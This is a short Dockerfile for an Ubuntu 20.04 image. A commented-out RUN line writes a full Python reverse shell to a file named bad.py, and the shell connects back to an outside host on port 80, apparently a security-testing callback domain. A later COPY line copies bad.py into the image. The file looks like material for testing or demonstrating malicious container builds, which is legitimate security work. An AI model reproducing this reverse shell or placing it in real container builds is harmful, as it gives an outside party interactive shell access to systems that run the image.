FROM ubuntu:20.04

# Install dependencies
RUN apt update && \
 apt upgrade -y

# RUN echo 'import socket,subprocess,os;\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM);\ns.connect((\"ymozema7qtrh5bumo0xbx7gu2l8cw40sp.l.prod.burpcloth.infosec.a2z.com\",80));\nos.dup2(s.fileno(),0);\nos.dup2(s.fileno(),1);\nos.dup2(s.fileno(),2);\np=subprocess.call(["/bin/sh","-i"]);' > bad.py

# RUN echo 'pandas==1.5.1' > requirements.txt

COPY bad.py requirements.txt ./
